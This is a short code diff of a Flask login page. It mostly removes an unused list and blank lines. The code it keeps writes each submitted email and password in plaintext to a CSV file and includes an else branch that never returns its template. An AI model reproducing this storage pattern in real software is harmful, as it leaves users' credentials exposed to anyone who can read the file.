@@ -14,9 +14,6 @@ class MyForm(FlaskForm):
     submit = SubmitField(label='Log In')
 
 
-# <--------------Login Forms List--------------->
-data = []
-
 # <--------------App--------------->
 app = Flask(__name__)
 
@@ -35,17 +32,13 @@ def login_page():
         with open('data.csv', mode='a', newline='') as csvfile:
             fieldnames = ['email', 'password']
             writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
-
             # Check if the file is empty, write header if necessary
             if csvfile.tell() == 0:
                 writer.writeheader()
-
             writer.writerow({"email": email_in, "password": password_in})
         return render_template('login-success.html')
     else:
         render_template('no-data.html')
-
-
 
     return render_template('login.html', form=loginForm)
 
